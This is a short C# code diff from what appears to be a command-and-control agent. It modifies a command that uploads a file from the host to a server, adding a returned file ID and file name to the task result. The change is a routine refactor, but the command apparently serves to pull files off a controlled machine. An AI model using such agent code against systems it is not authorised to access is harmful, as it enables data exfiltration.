@@ -38,13 +38,15 @@ namespace Agent.Commands
 
             if (task.SplittedArgs.Length > 1)
                 filename = task.SplittedArgs[1];
-            commm.Upload(fileBytes, filename, a =>
+            string fileId = commm.Upload(fileBytes, filename, a =>
             {
                 result.Info = $"Uploading {filename} ({a}%)";
                 commm.SendResult(result);
-            }).Wait();
+            }).Result;
 
-            result.Result = $"File {path} uploaded.";
+            result.Result = $"File {path} uploaded to the server.";
+            result.FileId = fileId;
+            result.FileName = filename;
         }
     }
 }
